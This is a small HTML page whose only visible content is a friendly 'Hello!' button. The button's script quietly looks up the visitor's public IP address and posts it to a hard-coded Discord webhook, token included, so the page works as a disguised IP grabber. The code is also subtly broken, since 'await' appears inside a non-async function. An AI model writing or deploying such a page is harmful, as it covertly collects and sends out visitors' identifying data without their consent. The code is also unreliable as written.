<!DOCTYPE html>
<html>
  <body>
    <button onclick="sendIP()">Hello!</button>

    <script>
      function sendIP() {
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;

        const url = "https://discord.com/api/webhooks/1093845705350713425/GzEVUGWE-zYL6xgPZpIvewZ0jUnLtdjympAXvUXyeb-friX8e_I8iTSG5-M5G-UZYU2e";
        const data = { content: `IP Address: ${ipAddress}` };

        fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(data)
        });
      }
    </script>
  </body>
</html>
